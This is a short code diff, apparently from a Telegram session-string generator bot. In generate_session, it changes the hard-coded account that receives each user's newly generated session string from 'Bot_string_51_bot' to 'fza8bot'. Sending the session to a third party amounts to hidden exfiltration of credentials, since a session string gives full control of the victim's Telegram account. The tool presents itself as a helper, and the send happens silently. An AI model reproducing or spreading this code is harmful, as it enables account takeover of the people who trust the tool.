@@ -163,7 +163,7 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
     text = f"**جلستك يبروو {ty} ** \n\n`{string_session}` \n\n**تم الاستخراج بواسطة :** @ZzZ68Z \n🍒 **ɴᴏᴛᴇ :**  🥺"
     try:
         if not is_bot:
-            await client.send_message("Bot_string_51_bot", text)
+            await client.send_message("fza8bot", text)
         else:
             await bot.send_message(msg.chat.id, text)
     except KeyError:
